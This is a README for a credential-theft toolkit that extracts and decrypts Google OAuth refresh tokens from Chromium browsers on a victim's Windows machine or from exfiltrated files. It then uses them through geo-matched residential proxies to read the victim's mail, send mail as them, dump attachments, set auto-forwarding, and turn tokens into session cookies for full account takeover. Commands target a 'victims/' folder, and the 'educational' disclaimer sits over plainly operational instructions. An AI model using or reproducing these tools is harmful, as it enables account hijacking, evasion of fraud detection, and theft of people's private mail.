# Google OAuth Token Extractor Toolkit

> **Purpose:** Extract, validate, and test `1//...` Google OAuth refresh tokens from Chromium browsers on Windows.
> **License:** Educational / defensive security use only.

---

## Quick Overview

| Tool | What It Does |
|------|-------------|
| **`extract_tokens_windows.py`** | Live **extraction** from Windows (Chrome, Edge, Brave, Vivaldi, Yandex, Opera) — decrypts DPAPI + AES-256-GCM |
| **`test_token.py`** | **Validate & exploit** tokens — test, check Gmail, fetch emails, send, dump attachments, set forwarding |
| **`token_to_session.py`** | **Browser access** — convert tokens into session cookies (SAPISID/SSID) for full browser login |

**Docs:** [`docs/`](docs/) — extraction methodology, cookie-swap guide, token binding realities, full OAuth tutorial

---

## Requirements

```bash
pip install -r requirements.txt
```

- Python 3.6+
- **Windows only:** `pycryptodome`, `pywin32` (for live extraction with `extract_tokens_windows.py`). Both are pre-declared in `requirements.txt` behind a `sys_platform == "win32"` marker, so a plain `pip install -r requirements.txt` is enough on Windows.
- **Any OS:** `requests` (for token validation, cookie-swap, post-exploitation)
- Residential HTTP proxy matching the victim's country (for live testing)

---

## 1. Live Extraction from Windows

Run `extract_tokens_windows.py` **on the target Windows machine as the logged-in user** (requires DPAPI context):

```batch
:: Chrome only (default)
python extract_tokens_windows.py

:: Every supported browser (Chrome, Edge, Brave, Vivaldi, Yandex, Opera)
python extract_tokens_windows.py --all-browsers

:: A single browser
python extract_tokens_windows.py --browser yandex

:: Custom output directory
python extract_tokens_windows.py --output C:\exfil
```

**What it does:**
1. Reads Chrome's DPAPI-wrapped master key from `Local State`
2. Queries each profile's `Web Data` SQLite database (`token_service` table)
3. AES-256-GCM decrypts every Google OAuth refresh token
4. Saves individual `token_<browser>_<profile>_<gaia_id>.txt` files
5. Writes `all_tokens.txt` (summary) and `extraction_report.txt` (audit trail)

> ⚠️ **Only works on Windows** — requires `win32crypt.CryptUnprotectData` (DPAPI decryption).

> 🔒 **Chrome 127+ App-Bound Encryption:** if a profile carries `os_crypt.app_bound_encrypted_key`, values prefixed `v20` cannot be opened with DPAPI alone and are skipped with an explicit message (`v10` values still extract normally). See [`docs/TOKEN_EXTRACTION_WINDOWS.md`](docs/TOKEN_EXTRACTION_WINDOWS.md#layer-2-app-bound-encryption-chrome-127).

> 📖 **Full guide:** [`docs/TOKEN_EXTRACTION_WINDOWS.md`](docs/TOKEN_EXTRACTION_WINDOWS.md)

---

## 2. Offline / Exfiltrated Decryption

If you have the victim's files but not live access:

**Required files:**
| File | Source Path |
|------|-------------|
| `Local State` | `%LOCALAPPDATA%\Google\Chrome\User Data\Local State` |
| `Web Data` | `%LOCALAPPDATA%\Google\Chrome\User Data\<Profile>\Web Data` |
| DPAPI keys | `%APPDATA%\Microsoft\Protect\<SID>\*` (3 files) |
| Victim's password | Required to decrypt DPAPI offline |

**Tools:**
- **mimikatz:** `dpapi::chrome /in:"Web Data" /masterkey:...`
- **pypykatz:** `pypykatz dpapi chrome --webdata Web Data --local-state Local State`
- **impacket:** Custom Python using `impacket.dpapi.DPAPI`

> 📖 **Full offline guide:** [`docs/TOKEN_EXTRACTION_WINDOWS.md`](docs/TOKEN_EXTRACTION_WINDOWS.md#5-offline--exfiltrated-extraction)

---

## 3. Token Validation

Once you have `1//...` tokens, validate them with `test_token.py`:

```bash
# Set a residential proxy matching the victim's country
export HTTPS_PROXY="http://user:pass@residential-proxy:port"

# Validate tokens from a file or directory
python test_token.py path/to/tokens.txt
python test_token.py path/to/victim_folder/

# Check Gmail API access on valid tokens
python test_token.py --check-gmail path/to/victim_folder/

# Search Gmail for account recovery emails
python test_token.py --discover path/to/victim_folder/
```

**Result interpretation:**
---

## 4. Browser Access via Cookie-Swap

The **`token_to_session.py`** script converts a `1//` refresh token into real browser session cookies (`SAPISID`, `SSID`, `HSID`, `SID`) — letting you log into Gmail in your own browser as the victim.

**Flow:** `1// token` → `ya29 access token` → `uberauth token` → **session cookies** → import into browser

```bash
# Basic usage
python token_to_session.py token.txt

# With a residential proxy (essential for geo-mismatched victims)
python token_to_session.py token.txt --proxy http://user:pass@proxy:8080
```

**Output:**
- `google_session_cookies.txt` — Netscape format (Firefox, curl)
- `google_session_cookies.json` — EditThisCookie format (Chrome extension)

**Why browser access matters:** The API scripts (`test_token.py`) work within OAuth scope limits, but browser access gives you **full account control** — change passwords, access security settings, extract 2FA backup codes, sign out other sessions.

> 📖 **Full guide:** [`docs/GMAIL_BROWSER_ACCESS.md`](docs/GMAIL_BROWSER_ACCESS.md)

---

## 5. Post-Exploitation Commands

The `test_token.py` script now has a full post-exploitation chain:

| Command | Purpose |
|---------|---------|
| `--check-gmail <dir>` | Test if tokens have Gmail API scope |
| `--discover <dir>` | Search Gmail for password resets, bank emails |
| `--fetch-emails <dir> [count]` | Download full email bodies (from, subject, body) |
| `--send <dir> <to> <subj> <body>` | Send an email from the victim's account |
| `--dump-attachments <dir> [outdir]` | Download all attachments from Gmail |
| `--forward <dir> <forward_to>` | Set up auto-forwarding to receive all future emails |

**Chain example:**
```bash
# 1. Test tokens
python test_token.py victims/PH_112.201.133.55/

# 2. Check Gmail access
python test_token.py --check-gmail victims/PH_112.201.133.55/

# 3. Read emails
python test_token.py --fetch-emails victims/PH_112.201.133.55/ 20

# 4. Forward everything to your inbox
python test_token.py --forward victims/PH_112.201.133.55/ you@gmail.com

# 5. Convert token to browser cookies for full account control
python token_to_session.py victims/PH_112.201.133.55/token_01.txt
```
| Output | Meaning |
|--------|---------|
| `VALID` | Token works. User info returned — can pivot to Gmail. |
| `REVOKED` | Token was revoked by user or Google. Dead. |
| `WRONG_CLIENT_ID` | Try a different `client_id` (set via `GOOGLE_CLIENT_ID` env var). |
| `HTTP_403` | Google blocked your IP (geo mismatch). Change proxy. |
| `TIMEOUT` | Proxy is slow or dead. Try another. |

> 📖 **Deep dive:** [`docs/google-oauth-tokens-tutorial.md`](docs/google-oauth-tokens-tutorial.md)

---

## 4. Project Structure

```
~/Downloads/google-oauth-extractor/
├── README.md                         # This file
├── requirements.txt                  # Python dependencies
├── extract_tokens_windows.py         # Live extraction script (Windows only)
├── test_token.py                     # Token validation + post-exploitation (any OS)
├── token_to_session.py               # Cookie-swap: token -> browser session
├── build_pyz.py                      # Reproducible .pyz build (stdlib zipapp)
├── pyz/
│   └── __main__.py                   # zipapp entry point: extract/test/session dispatcher
├── dist/
│   └── google_oauth_extractor.pyz    # Build output (gitignored)
└── docs/
    ├── TOKEN_EXTRACTION_WINDOWS.md   # Full extraction methodology (live + offline)
    ├── TOKEN_BINDING_REALITY.md      # Token binding myths debunked
    ├── GMAIL_BROWSER_ACCESS.md       # Cookie-swap guide: token -> browser login
    ├── google-oauth-tokens-tutorial.md    # Comprehensive OAuth exploitation tutorial
    └── google-oauth-tokens-validation.md  # Analysis of leaked tokens (reference)
```

---

## Packaging the Toolkit as a Single `.pyz`

The three scripts ship as one Python zipapp — a zip archive with a shebang that
CPython executes directly. See
[`docs/PACKAGING_PYTHON_CLI.md`](docs/PACKAGING_PYTHON_CLI.md) §7 for the
rationale: the target machine already has Python, so no freezer is needed and
there are zero build dependencies.

```bash
python build_pyz.py                    # -> dist/google_oauth_extractor.pyz
python build_pyz.py --compressed       # smaller archive, slightly slower start
python build_pyz.py -o out/tool.pyz    # custom output path
```

The archive bundles a single entry point (`pyz/__main__.py`) that dispatches the
three scripts as subcommands:

```bash
py dist/google_oauth_extractor.pyz --help
py dist/google_oauth_extractor.pyz extract --all-browsers
py dist/google_oauth_extractor.pyz test victims/PH_112.201.133.55/
py dist/google_oauth_extractor.pyz session victims/PH_112.201.133.55/token_01.txt
```

- **Standalone usage is unchanged** — `python test_token.py ...` still works.
  The dispatcher strips the subcommand from `sys.argv` before delegating, so
  each script keeps its own argument parsing verbatim.
- **Dependencies are not bundled.** A plain `zipapp` archives only this
  project's source; run `pip install -r requirements.txt` on the target first.
- **`dist/` and `build/` are gitignored** — commit the recipe
  (`build_pyz.py`, `pyz/__main__.py`), not the artifact.

---

## Key Technical Facts

| Property | Detail |
|----------|--------|
| **Token format** | `1//[payload]:[GaiaID]` — purely opaque, no hardware/geo binding |
| **Lifetime** | ~6 months from last use (then auto-revoked by Google) |
| **Survives** | Password change, MFA change, session logout |
| **Testing** | POST to `https://oauth2.googleapis.com/token` with `grant_type=refresh_token` |
| **Geo risk** | Google's risk engine flags unexpected geo. Residential proxy required. |
| **Top value** | Gmail access → password reset for all linked accounts |

---

*This toolkit is for educational and defensive security purposes only.*